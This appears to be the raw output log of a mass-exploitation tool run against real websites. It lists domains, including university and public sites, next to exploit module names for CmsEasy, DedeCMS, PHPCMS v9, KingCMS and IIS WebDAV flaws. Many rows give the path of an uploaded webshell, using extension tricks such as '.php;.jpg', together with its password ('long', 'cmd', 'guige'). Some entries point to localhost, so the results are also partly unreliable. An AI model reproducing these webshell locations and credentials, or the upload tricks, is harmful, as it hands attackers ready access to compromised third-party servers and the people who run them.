
[0, 'qingyue.org', 'exp', 'exp_cmseasy_IIS6_jx', 'http://qingyue.org/celive/live/doajaxfileupload.php', '', '']
[0, 'qingyue.org', 'exp', 'exp_etcms_Upload_shell', 'http://hmu159195.chinaw3.com/celive/uploadfiles/CELIVE-2IRgL4rt59.php;.jpg', 'long', 'webshell']
[0, '173.83.139.205', 'exp', 'exp_cmseasy_IIS6_jx', 'http://173.83.139.205/celive/live/doajaxfileupload.php', '', '']
[0, 'www.dgjijia.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.dgjijia.com/celive/live/doajaxfileupload.php', '', '']
[0, 'senpaizh.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://senpaizh.com/celive/live/doajaxfileupload.php', '', '']
[0, 'senpaizh.com', 'exp', 'exp_etcms_Upload_shell', 'http://www.senpaizh.com/celive/uploadfiles/CELIVE-6P6xEtKLn8.php;.jpg', 'long', 'webshell']
[0, 'www.chinajessica.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.chinajessica.com/celive/live/doajaxfileupload.php', '', '']
[0, 'szxitai.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://szxitai.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.echenxu.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.echenxu.com/celive/live/doajaxfileupload.php', '', '']
[0, 'szxitai.com', 'exp', 'exp_etcms_Upload_shell', 'http://www.szxitai.com/celive/uploadfiles/CELIVE-PtDsa1g4op.php;.jpg', 'long', 'webshell']
[0, 'www.jk-jk.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.jk-jk.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.0574shfc.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.0574shfc.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.skyscom.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.skyscom.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.echenxu.com', 'exp', 'exp_etcms_Upload_shell', 'http://zf.molinks.cn/celive/uploadfiles/CELIVE-1vhKSH50t9.php;.jpg', 'long', 'webshell']
[0, 'www.sdsywfg.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.sdsywfg.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.sdsywfg.com', 'exp', 'exp_etcms_Upload_shell', 'http://websdtxdl.248.gotohost2.com/celive/uploadfiles/CELIVE-XSK8VAgVMw.php;.jpg', 'long', 'webshell']
[0, 'www.skyscom.com', 'exp', 'exp_etcms_Upload_shell', 'http://127.0.0.1/CmsEasy/celive/uploadfiles/CELIVE-6owH0GqkMr.php;.jpg', 'long', 'webshell']
[0, 'www.jk-jk.com', 'exp', 'exp_etcms_Upload_shell', 'http://localhost/celive/uploadfiles/CELIVE-FRF3Ra6Zsj.php;.jpg', 'long', 'webshell']
[0, 'wangyuyan.gotoip1.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://wangyuyan.gotoip1.com/celive/live/doajaxfileupload.php', '', '']
[0, 'ceie.swu.edu.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://ceie.swu.edu.cn/celive/live/doajaxfileupload.php', '', '']
[0, 'dzb.swuyc.edu.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://dzb.swuyc.edu.cn/celive/live/doajaxfileupload.php', '', '']
[0, 'www.hxgcjl.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.hxgcjl.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.lunte.com.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.lunte.com.cn/celive/live/doajaxfileupload.php', '', '']
[0, 'www.smarte.com.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.smarte.com.cn/celive/live/doajaxfileupload.php', '', '']
[0, 'fjsja.net', 'exp', 'exp_cmseasy_IIS6_jx', 'http://fjsja.net/celive/live/doajaxfileupload.php', '', '']
[0, 'www.smarte.com.cn', 'exp', 'exp_etcms_Upload_shell', 'http://localhost/celive/uploadfiles/CELIVE-j3XQqhUY5u.php;.jpg', 'long', 'webshell']
[0, 'www.healthy-drinking.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.healthy-drinking.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.besthcw.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.besthcw.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.skytekoptronics.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.skytekoptronics.com/celive/live/doajaxfileupload.php', '', '']
[0, 'tingqiantianwai.gotoip1.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://tingqiantianwai.gotoip1.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.haocaipu.org', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.haocaipu.org/celive/live/doajaxfileupload.php', '', '']
[0, 'mideatz.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://mideatz.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.haocaipu.org', 'exp', 'exp_etcms_Upload_shell', 'http://www.haocaipu.org/celive/uploadfiles/CELIVE-NDBdd6FkS1.php;.jpg', 'long', 'webshell']
[0, 'mideatz.com', 'exp', 'exp_etcms_Upload_shell', 'http://test.idom.cn/cmseasy/celive/uploadfiles/CELIVE-xyhKnpviWu.php;.jpg', 'long', 'webshell']
[0, 'bernytj.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://bernytj.com/celive/live/doajaxfileupload.php', '', '']
[0, 'bernytj.com', 'exp', 'exp_etcms_Upload_shell', 'http://www.zgzsyjs.com/berny/celive/uploadfiles/CELIVE-OjGcvGEqDX.php;.jpg', 'long', 'webshell']
[0, 'www.csit.cc', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.csit.cc/celive/live/doajaxfileupload.php', '', '']
[0, 'www.csit.cc', 'exp', 'exp_etcms_Upload_shell', 'http://localhost/CmsEasy/uploads/celive/uploadfiles/CELIVE-884oL3M9Fb.php;.jpg', 'long', 'webshell']
[0, 'geek-ad.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://geek-ad.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.tjsto.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.tjsto.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.jingzhaokeji.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.jingzhaokeji.com/celive/live/doajaxfileupload.php', '', '']
[0, 'geek-ad.com', 'exp', 'exp_etcms_Upload_shell', 'http://geek-ad.com/celive/uploadfiles/CELIVE-gP8c035dtc.php;.jpg', 'long', 'webshell']
[0, 'guanyiyinshua.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://guanyiyinshua.com/celive/live/doajaxfileupload.php', '', '']
[0, 'defdy.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://defdy.com/celive/live/doajaxfileupload.php', '', '']
[0, 'bbs.dedecms.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://bbs.dedecms.com/celive/live/doajaxfileupload.php', '', '']
[0, 'bbs.dedecms.com', 'exp', 'exp_dedecms_yijuhua', 'http://bbs.dedecms.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.360doc.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.360doc.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.pcpc.me', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.pcpc.me/celive/live/doajaxfileupload.php', '', '']
[0, 'www.bjhjwl.net', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.bjhjwl.net/celive/live/doajaxfileupload.php', '', '']
[0, 'skull88.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://skull88.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.kid520.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.kid520.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.kid520.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.kid520.com/plus/dst.php', 'cmd', 'webshell']
[0, 'househunting.net84.net', 'exp', 'exp_cmseasy_IIS6_jx', 'http://househunting.net84.net/celive/live/doajaxfileupload.php', '', '']
[0, 'leshou.com', 'exp', 'exp_dedecms_yijuhua', 'http://leshou.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.szaswei.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.szaswei.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.xjat.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.xjat.com/celive/live/doajaxfileupload.php', '', '']
[0, 'qiujipiao.com', 'exp', 'exp_dedecms_getshell', 'http://qiujipiao.com/plus/90sec.php', 'guige', 'webshell']
[0, 'web.mmc.edu.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://web.mmc.edu.cn/celive/live/doajaxfileupload.php', '', '']
[0, 'www.joyme999.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.joyme999.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.10s1.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.10s1.com/plus/dst.php', 'cmd', 'webshell']
[0, '18book.site88.net', 'exp', 'exp_cmseasy_IIS6_jx', 'http://18book.site88.net/celive/live/doajaxfileupload.php', '', '']
[0, 'www.c133.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.c133.com/plus/dst.php', 'cmd', 'webshell']
[0, 'ln110.com.cn', 'exp', 'exp_dedecms_yijuhua', 'http://ln110.com.cn/plus/dst.php', 'cmd', 'webshell']
[0, 'www.pgpop.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.pgpop.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.pgpop.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.pgpop.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.wzzgshow.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.wzzgshow.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.224ylc.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.224ylc.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.224ylc.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.224ylc.com/plus/dst.php', 'cmd', 'webshell']
[0, 'bbs.chinaunix.net', 'exp', 'exp_cmseasy_IIS6_jx', 'http://bbs.chinaunix.net/celive/live/doajaxfileupload.php', '', '']
[0, 'bbs.hanzify.org', 'exp', 'exp_cmseasy_IIS6_jx', 'http://bbs.hanzify.org/celive/live/doajaxfileupload.php', '', '']
[0, 'bbs.hanzify.org', 'exp', 'exp_dedecms_yijuhua', 'http://bbs.hanzify.org/plus/dst.php', 'cmd', 'webshell']
[0, 'www.2cto.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.2cto.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.2cto.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.2cto.com/plus/dst.php', 'cmd', 'webshell']
[0, 'bbs.eic.org.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://bbs.eic.org.cn/celive/live/doajaxfileupload.php', '', '']
[0, '0753mp.com', 'exp', 'exp_dedecms_yijuhua', 'http://0753mp.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.gofundme.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.gofundme.com/celive/live/doajaxfileupload.php', '', '']
[0, 'smez.net', 'exp', 'exp_phpcmsv9_getshell', 'http://smez.net/uploadfile/2013/0624/thumb_6_6_.Php.JPG%20%20%20%20%20%20%20Php', 'long', 'webshell']
[0, 'www.kangxinwang.com', 'exp', 'exp_phpcmsv9_getshell', 'http://www.kangxinwang.com/uploadfile/2013/0624/thumb_6_6_.Php.JPG%20%20%20%20%20%20%20Php', 'long', 'webshell']
[0, 'www.xzqh.org', 'exp', 'exp_phpcmsv9_getshell', 'http://www.xzqh.org/uploadfile/1222.thumb_.Php.JPG%20%20%20%20%20%20%20Php', 'long', 'webshell']
[0, 'www.zwyl.cn', 'exp', 'exp_dedecms_yijuhua', 'http://www.zwyl.cn/plus/dst.php', 'cmd', 'webshell']
[0, 'www.caje.org', 'exp', 'exp_dedecms_yijuhua', 'http://www.caje.org/plus/dst.php', 'cmd', 'webshell']
[0, 'www.ldzc.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.ldzc.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.ldzc.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.ldzc.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.chinapp.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.chinapp.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.chinapp.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.chinapp.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.khlvyou.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.khlvyou.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.rebx.net', 'exp', 'exp_dedecms_yijuhua', 'http://www.rebx.net/plus/dst.php', 'cmd', 'webshell']
[0, 'www.bgmicrose.com', 'exp', 'exp_phpcmsv9_getshell', 'http://www.bgmicrose.com/uploadfile/thumb_6_6_.Php.JPG%20%20%20%20%20%20%20Php', 'long', 'webshell']
[0, 'www.qiuxue.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.qiuxue.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.hehongshen.net', 'exp', 'exp_phpcmsv9_getshell', 'http://www.hehongshen.net/uploadfile/2013/0624/thumb_6_6_.Php.JPG%20%20%20%20%20%20%20Php', 'long', 'webshell']
[0, 'www.bhgbox.org', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.bhgbox.org/celive/live/doajaxfileupload.php', '', '']
[0, 'www.xilu.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.xilu.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.xilu.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.xilu.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.xbrmachine.com', 'exp', 'exp_phpcmsv9_getshell', 'http://www.xbrmachine.com/uploadfile/2013/0624/thumb_6_6_.Php.JPG%20%20%20%20%20%20%20Php', 'long', 'webshell']
[0, 'www.ymzj.cn', 'exp', 'exp_dedecms_yijuhua', 'http://www.ymzj.cn/plus/dst.php', 'cmd', 'webshell']
[0, 'www.ahnow.cn', 'exp', 'exp_dedecms_getshell', 'http://www.ahnow.cn/plus/90sec.php', 'guige', 'webshell']
[0, 'www.xydai.cn', 'exp', 'exp_dedecms_yijuhua', 'http://www.xydai.cn/plus/dst.php', 'cmd', 'webshell']
[0, 'bo80.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://bo80.com/celive/live/doajaxfileupload.php', '', '']
[0, 'www.hao326.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.hao326.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.phpall.cn', 'exp', 'exp_dedecms_yijuhua', 'http://www.phpall.cn/plus/dst.php', 'cmd', 'webshell']
[0, 'www.kingcms.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.kingcms.cn/celive/live/doajaxfileupload.php', '', '']
[0, 'www.lstest.com', 'exp', 'exp_kingcms_getshell', 'http://www.lstest.com/Style.php', 'cmd', 'webshell']
[0, 'www.iamwawa.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.iamwawa.cn/celive/live/doajaxfileupload.php', '', '']
[0, 'www.iamwawa.cn', 'exp', 'exp_dedecms_yijuhua', 'http://www.iamwawa.cn/plus/dst.php', 'cmd', 'webshell']
[0, 'www.hdjcw.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.hdjcw.com/plus/dst.php', 'cmd', 'webshell']
[0, 'www.xingan123.com', 'exp', 'exp_dedecms_yijuhua', 'http://www.xingan123.com/plus/dst.php', 'cmd', 'webshell']
[0, 'bbs.nowwing.com', 'exp', 'exp_cmseasy_IIS6_jx', 'http://bbs.nowwing.com/celive/live/doajaxfileupload.php', '', '']
[0, 'bbs.nowwing.com', 'exp', 'exp_dedecms_yijuhua', 'http://bbs.nowwing.com/plus/dst.php', 'cmd', 'webshell']
[0, 'mige0520.appspot.com', 'exp', 'exp_dedecms_yijuhua', 'http://mige0520.appspot.com/plus/dst.php', 'cmd', 'webshell']
[0, '20120101.net', 'exp', 'exp_cmseasy_IIS6_jx', 'http://20120101.net/celive/live/doajaxfileupload.php', '', '']
[0, '20120101.net', 'exp', 'exp_dedecms_yijuhua', 'http://20120101.net/plus/dst.php', 'cmd', 'webshell']
[0, 'www.zhangshiju.com', 'exp', 'exp_IISwebdav_move', 'http://www.zhangshiju.com/twcemnlf.asp;jpg', 'long', 'webshell']
[0, 'www.kingcms.org.cn', 'exp', 'exp_cmseasy_IIS6_jx', 'http://www.kingcms.org.cn/celive/live/doajaxfileupload.php', '', '']
[0, 'www.jwqzjx.cn', 'exp', 'exp_dedecms_yijuhua', 'http://www.jwqzjx.cn/plus/dst.php', 'cmd', 'webshell']
[0, 'bbs.htpc1.com', 'exp', 'exp_dedecms_yijuhua', 'http://bbs.htpc1.com/plus/dst.php', 'cmd', 'webshell']
